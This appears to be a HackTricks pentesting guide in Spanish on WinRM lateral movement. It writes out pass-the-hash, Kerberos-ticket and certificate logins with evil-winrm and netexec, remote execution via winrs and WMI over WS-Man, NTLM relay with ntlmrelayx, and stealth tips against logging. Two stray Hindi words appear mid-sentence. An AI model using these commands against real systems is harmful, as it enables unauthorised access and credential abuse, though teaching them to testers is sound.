# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM es uno de los transportes de **lateral movement** más convenientes en entornos Windows porque te da una shell remota sobre **WS-Man/HTTP(S)** sin necesitar trucos de creación de servicios SMB. Si el objetivo expone **5985/5986** y tu principal tiene अनुमति para usar remoting, a menudo puedes pasar de "valid creds" a "interactive shell" muy rápido.

Para la **enumeración del protocolo/servicio**, listeners, habilitar WinRM, `Invoke-Command`, y uso genérico del cliente, revisa:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Why operators like WinRM

- Usa **HTTP/HTTPS** en lugar de SMB/RPC, así que a menudo funciona donde la ejecución estilo PsExec está bloqueada.
- Con **Kerberos**, evita enviar credenciales reutilizables al objetivo.
- Funciona limpiamente desde tooling de **Windows**, **Linux** y **Python** (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- El camino interactivo de PowerShell remoting crea **`wsmprovhost.exe`** en el objetivo bajo el contexto del usuario autenticado, lo cual es operativamente diferente de la ejecución basada en servicios.

## Access model and prerequisites

En la práctica, el lateral movement exitoso por WinRM depende de **tres** cosas:

1. El objetivo tiene un **WinRM listener** (`5985`/`5986`) y reglas de firewall que permiten el acceso.
2. La cuenta puede **autenticarse** en el endpoint.
3. La cuenta tiene permiso para **abrir una sesión de remoting**.

Formas comunes de obtener ese acceso:

- **Local Administrator** en el objetivo.
- Membresía en **Remote Management Users** en sistemas más nuevos o **WinRMRemoteWMIUsers__** en sistemas/componentes que todavía respetan ese grupo.
- Derechos de remoting explícitos delegados mediante descriptores de seguridad locales / cambios en ACL de PowerShell remoting.

Si ya controlas una máquina con privilegios de admin, recuerda que también puedes **delegar acceso WinRM sin pertenecer al grupo de admin completo** usando las técnicas descritas aquí:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Authentication gotchas that matter during lateral movement

- **Kerberos requires a hostname/FQDN**. Si te conectas por IP, el cliente normalmente hace fallback a **NTLM/Negotiate**.
- En casos de borde de **workgroup** o de confianza cruzada, NTLM normalmente requiere **HTTPS** o que el objetivo se añada a **TrustedHosts** en el cliente.
- Con **local accounts** sobre Negotiate en un workgroup, las restricciones remotas de UAC pueden impedir el acceso a menos que se use la cuenta integrada de Administrator o `LocalAccountTokenFilterPolicy=1`.
- PowerShell remoting usa por defecto el SPN **`HTTP/<host>`**. En entornos donde **`HTTP/<host>`** ya está registrado a otra cuenta de servicio, WinRM Kerberos puede fallar con `0x80090322`; usa un SPN calificado por puerto o cambia a **`WSMAN/<host>`** donde exista ese SPN.

Si consigues credenciales válidas durante password spraying, validarlas por WinRM suele ser la forma más rápida de comprobar si se traducen en una shell:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Linux-to-Windows lateral movement

### NetExec / CrackMapExec para validación y ejecución de un solo comando
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM para shells interactivos

`evil-winrm` sigue siendo la opción interactiva más conveniente desde Linux porque soporta **passwords**, **NT hashes**, **Kerberos tickets**, **client certificates**, transferencia de archivos y carga en memoria de PowerShell/.NET.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Caso límite de Kerberos SPN: `HTTP` vs `WSMAN`

Cuando el SPN predeterminado **`HTTP/<host>`** causa fallos de Kerberos, intenta solicitar/usar un ticket **`WSMAN/<host>`** en su lugar. Esto aparece en configuraciones empresariales endurecidas o extrañas donde **`HTTP/<host>`** ya está asociado a otra cuenta de servicio.
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Esto también es útil después del abuso de **RBCD / S4U** cuando específicamente forjaste o solicitaste un ticket de servicio **WSMAN** en lugar de un ticket genérico `HTTP`.

### Certificate-based authentication

WinRM también soporta **client certificate authentication**, pero el certificate debe estar mapeado en el objetivo a una **local account**. Desde una perspectiva ofensiva esto importa cuando:

- robaste/exportaste un valid client certificate y private key ya mapeados para WinRM;
- abusaste de **AD CS / Pass-the-Certificate** para obtener un certificate para un principal y luego pivotaste a otra authentication path;
- estás operando en entornos que evitan deliberadamente el remoting basado en password.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM es mucho menos común que la autenticación por password/hash/Kerberos, pero cuando existe puede proporcionar una vía de **lateral movement sin password** que sobrevive a la rotación de passwords.

### Python / automation with `pypsrp`

Si necesitas automatización en lugar de un shell de operador, `pypsrp` te ofrece WinRM/PSRP desde Python con soporte para **NTLM**, **certificate auth**, **Kerberos** y **CredSSP**.
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
## Movimiento lateral WinRM nativo de Windows

### `winrs.exe`

`winrs.exe` está integrado y es útil cuando quieres **ejecución nativa de comandos por WinRM** sin abrir una sesión interactiva de PowerShell remoting:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Operativamente, `winrs.exe` comúnmente resulta en una cadena de procesos remota similar a:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Esto vale la pena recordarlo porque difiere de exec basado en servicios y de sesiones PSRP interactivas.

### `winrm.cmd` / WS-Man COM en lugar de PowerShell remoting

También puedes ejecutar a través de **WinRM transport** sin `Enter-PSSession` invocando clases WMI sobre WS-Man. Esto mantiene el transport como WinRM mientras que la primitiva de ejecución remota pasa a ser **WMI `Win32_Process.Create`**:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Ese enfoque es útil cuando:

- PowerShell logging está muy monitorizado.
- Quieres **WinRM transport** pero no un flujo de trabajo clásico de PS remoting.
- Estás construyendo o usando tooling personalizado alrededor del objeto COM **`WSMan.Automation`**.

## NTLM relay to WinRM (WS-Man)

Cuando SMB relay está bloqueado por signing y LDAP relay está restringido, **WS-Man/WinRM** aún puede ser un objetivo de relay atractivo. `ntlmrelayx.py` moderno incluye **WinRM relay servers** y puede hacer relay a objetivos **`wsman://`** o **`winrms://`**.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Dos notas prácticas:

- Relay es más útil cuando el objetivo acepta **NTLM** y el principal relayed tiene अनुमति para usar WinRM.
- El código reciente de Impacket maneja específicamente solicitudes **`WSMANIDENTIFY: unauthenticated`** para que las sondas estilo `Test-WSMan` no rompan el flujo del relay.

Para restricciones multi-hop después de obtener una primera sesión WinRM, revisa:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Notas de OPSEC y detección

- El **PowerShell remoting interactivo** normalmente crea **`wsmprovhost.exe`** en el objetivo.
- **`winrs.exe`** normalmente crea **`winrshost.exe`** y luego el proceso hijo solicitado.
- Espera telemetría de **network logon**, eventos del servicio WinRM y registro operativo/script-block de PowerShell si usas PSRP en lugar de `cmd.exe` en bruto.
- Si solo necesitas un único comando, `winrs.exe` o una ejecución WinRM de una sola vez puede ser más sigilosa que una sesión remota interactiva de larga duración.
- Si Kerberos está disponible, prefiere **FQDN + Kerberos** sobre IP + NTLM para reducir tanto problemas de confianza como cambios incómodos de `TrustedHosts` en el cliente.

## Referencias

- [Evil-WinRM README](https://github.com/Hackplayers/evil-winrm)
- [Microsoft: Error `0x80090322` cuando se conecta PowerShell a un servidor remoto mediante WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)

{{#include ../../banners/hacktricks-training.md}}
